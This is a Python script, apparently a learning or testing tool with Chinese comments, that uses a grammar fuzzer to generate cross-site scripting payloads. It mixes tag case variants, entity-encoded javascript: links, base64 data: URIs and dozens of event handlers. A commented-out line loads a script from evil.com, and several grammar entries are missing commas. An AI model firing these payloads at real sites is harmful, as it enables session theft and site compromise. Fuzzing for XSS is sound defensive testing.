# basic_fuzzer_sample.py

from fuzzingbook.Grammars import Grammar, is_valid_grammar
from fuzzingbook.GrammarFuzzer import GrammarFuzzer
import random

# --- 1. 定義一個簡單的數學運算語法 ---
# basic_fuzzer_sample.py 修正後的 XSS 語法


"""
# 這邊先跳過，不太懂規則
<select>
<math>
<form>
<frameset>
<marquee>
<style>

# 這邊是做完的
--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->
src=xxx:x
src="about:blank"
%3C
%3E
`
;
<svg><image href="x" onerror="alert(1)"></image></svg>
<svg>
<a href="\x0Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x00cript:javascript:alert(1)" id="fuzzelement1">test</a>
'"<<Scrip<script> ;
<audio>
<video>
<input>
<body>
<div>
<object>
<iframe>
<embed>

"""
XSS_GRAMMAR: Grammar = {
    "<start>": ["<script>", "<ImageTags>", "<alink>", "<media>", "<input>", "<normal>", "<ContextChange>"],
    
    # ; ' " ` < > %3E %3C  -->
    "<SpecialCharFronts>":[
        ";<",
        "\x00<",
        "'<",
        '"<',
        '`<',
        '<<',
        '<',
        '><',
        '>><',
        '%3E<',
        '%3C<',
        '--><!-- ---><',
        '--<'
    ],
    "<SpecialCharBacks>":[
        '>;',
        '>\x00',
        ">'",
        '>"',
        '>`',
        '><',
        '>>',
    ],
    "<typo>": [
        "text",
        "textarea",
        "select",
        "radio",
        "checkbox",
        "file",
        "password",
        "email",
        "url",
        "tel",
        "number",
        "date",
        "time",
        "datetime-local",
        "month",
        "week",
        "color",
        "hidden",
        "image",
        "submit",
        "button",
        "reset",
        "search",
        "tel",
        "url",
    ],

    "<ContextChange>": [
        '<SpecialCharFronts>object data=<ContextData> <trace_tag> <object<SpecialCharBacks>',
        '<SpecialCharFronts>object data=<ContextData> <event>=<fire>> <trace_tag> <Object<SpecialCharBacks>',
        '<SpecialCharFronts>iframe src=<ContextData> <event>=<fire>> <trace_tag> <iframe<SpecialCharBacks>',
        '<SpecialCharFronts>iframe src=<ContextData>> <trace_tag> <iframe<SpecialCharBacks>'
        '<SpecialCharFronts>embed src=<ContextData>> <trace_tag> <embed<SpecialCharBacks>'
        '<SpecialCharFronts>embed src=<ContextData> <event>=<fire>> <trace_tag> <embed<SpecialCharBacks>'
    ],

    "<escape>": [
        '<'
    ],
    
    "<ContextData>": [
        '"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg" type="text/html'
        '"data:text/html,<escape>script><fire><escape>/script>" type="text/html'
        '"data:application/xml,<ImageTags>" type="application/xml'
        '"data:text/html,<escape>script><fire><escape>/script>" type="text/html'
        '"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg" type="text/html'
    ],

    "<input>": [
        '<SpecialCharFronts>input type=<typo> <event>=<fire><SpecialCharBacks>',
        '<SpecialCharFronts>Input type=<typo> <event>=<fire><SpecialCharBacks>',
        '<SpecialCharFronts>INPUT type=<typo> <event>=<fire><SpecialCharBacks>',
    ],

    # onload 可以觸發 script
    "<normal>": [
        "<SpecialCharFronts>body <event>=<fire>> <trace_tag>  </body<SpecialCharBacks>",
        "<SpecialCharFronts>Body <event>=<fire>> <trace_tag> </Body<SpecialCharBacks>",
        "<SpecialCharFronts>BODY <event>=<fire>> <trace_tag> </BODY<SpecialCharBacks>",
        "<SpecialCharFronts>div <event>=<fire>> <trace_tag> </div<SpecialCharBacks>",
        "<SpecialCharFronts>Div <event>=<fire>> <trace_tag> </Div<SpecialCharBacks>",
        "<SpecialCharFronts>DIV <event>=<fire>> <trace_tag> </DIV<SpecialCharBacks>",
    ],


    "<script>" :[
        '<SpecialCharFronts>script> <fire> </Script<SpecialCharBacks>',
        '<SpecialCharFronts>SCript> <fire> </ScRipt<SpecialCharBacks>',
        '<SpecialCharFronts>Scri><SpecialCharFronts>scriPT> <fire> </scriPT<SpecialCharBacks>',
        '<SpecialCharFronts>Script> <fire> </script<SpecialCharBacks>',
        '<SpecialCharFronts>Script> <fire> </script<SpecialCharBacks>',
    ],

    "<alink>": [
        '<SpecialCharFronts>a <href>><trace_tag> </a<SpecialCharBacks>',
        '<SpecialCharFronts>A <href>><trace_tag> </A<SpecialCharBacks>',
    ],
    
    "<ImageTag>": [
        '<SpecialCharFronts>image',
        '<SpecialCharFronts>IMg',
        '<SpecialCharFronts>IMG',
        '<SpecialCharFronts>IMAge',
    ],

    "<ImageTags>": [
        '<SpecialCharFronts>IMg <src_img> <event>=<fire>>',
        '<SpecialCharFronts>IMG <src_img> <event>=<fire>>',
        '<SpecialCharFronts>image <src_img> <event>=<fire>>',
        '<SpecialCharFronts>IMAge <src_img> <event>=<fire>>',
        '<SpecialCharFronts>svg <event>=<fire>> <ImageTag> <href> <event>=<fire>> </svg<SpecialCharBacks>',
        '<SpecialCharFronts>SVG <event>=<fire>> <ImageTag> <href> <event>=<fire>> </SVG<SpecialCharBacks>',
        '<SpecialCharFronts>sVG <event>=<fire>> <ImageTag> <href> <event>=<fire>> </sVG<SpecialCharBacks>',
    ],

    "<href>": [
        'href=x',
        'HRef=javascript:<fire>',
        'href=javascript:<fire>',
        'href=jAVascrIPT:<fire>',
        'href=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:<fire>',
        'href=&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:<fire>',
        'href="javas&#99;ript:<fire>',
    ],

    "<media>" :[
        '<SpecialCharFronts>audio <src_img> <event>=<fire>>',
        '<SpecialCharFronts>video <src_img> <event>=<fire>>',
    ],
    
    "<src_img>":[
        'src',
        'src=<ImageTags>'
        'src=x',
        'src/=/x',
        'src=/xxx:x/',
        'src=about:blank',
    ],
    
    "<fire>": [
        "alert(<trace_tag>)",
        "Alert(<trace_tag>)",
        "prompt(<trace_tag>)",
        "Prompt(<trace_tag>)",
        "confirm(<trace_tag>)",
        "Confirm(<trace_tag>)",
        "Open(<trace_tag>)",
        "open(<trace_tag>)",
        "console.log(<trace_tag>)",
        "Console.log(<trace_tag>)",
        "eval('<fire>')",
        "setTimeout(<fire>,'1000')"
        # "(function(){var s=document.createElement('script');s.src='http://evil.com/xss.js';document.body.appendChild(s);})()"
    ],

    "<event>": [
        "onerror", 
        "onload", 
        "onfocus",
        "onpageshow",
        "oncopy",
        "oncut",
        "onpaste",
        "ontoggle",
        "onwaiting",
        "onvolumechange",
        "ontimeupdate",
        "onsuspend",
        "onstalled",
        "onseeking",
        "onseeked",
        "onratechange",
        "onprogress",
        "onplaying",
        "onplay",
        "onpause",
        "onloadstart",
        "onloadedmetadata",
        "onloadeddata",
        "onended",
        "onemptied",
        "ondurationchange",
        "oncuechange",
        "oncanplaythrough",
        "oncanplay",
        "onabort",
        "draggable=\"true\" onscroll",
        "draggable=\"true\" ondrop",
        "draggable=\"true\" ondragstart",
        "draggable=\"true\" ondragover",
        "draggable=\"true\" ondragleave",
        "draggable=\"true\" ondragenter",
        "draggable=\"true\" ondragend",
        "draggable=\"true\" ondrag",
        "onwheel",
        "onmousewheel", # Deprecatd
        "onmouseup",
        "onmouseover",
        "onmouseout",
        "onmousemove",
        "onmousedown",
        "ondblclick",
        "onclick",
        "onkeyup",
        "onkeypress",
        "onkeydown",
        "onsubmit",
        "onselect",
        "onsearch",
        "onreset",
        "oninvalid",
        "oninput",
        "oncontextmenu",
        "onchange",
        "onblur",
        "onunload",
        "onstorage",
        "onresize",
        "onpopstate",
        "onpagehide",
        "ononline",
        "onoffline",
        "onmessage",
        "onhashchange",
        "onbeforeunload",
        "onbeforeprint",
        "onafterprint"
    ],

    "<trace_tag>": ['2'] 
}

if __name__ == '__main__':
    xss_fuzzer = GrammarFuzzer(XSS_GRAMMAR)
    for i in range(20):
        print(xss_fuzzer.fuzz())
        print('')